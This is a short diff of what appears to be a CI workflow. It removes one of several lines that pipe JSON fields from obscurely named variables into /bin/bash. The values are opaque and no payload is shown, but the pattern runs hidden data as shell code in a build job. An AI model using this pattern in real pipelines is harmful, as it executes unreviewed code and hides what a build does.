@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$rktnm8234" | jq -r .az52 | /bin/bash
           echo $t86 | jq -r .qahqi4 | /bin/bash
           echo $ucfo1917 | jq -r .xrxic6 | /bin/bash
-          echo $cqkx00371 | jq -r .d92 | /bin/bash
           echo $xlvgi700 | jq -r .kxuo27234 | /bin/bash
           echo $zye6 | jq -r .cafe7136 | /bin/bash
 
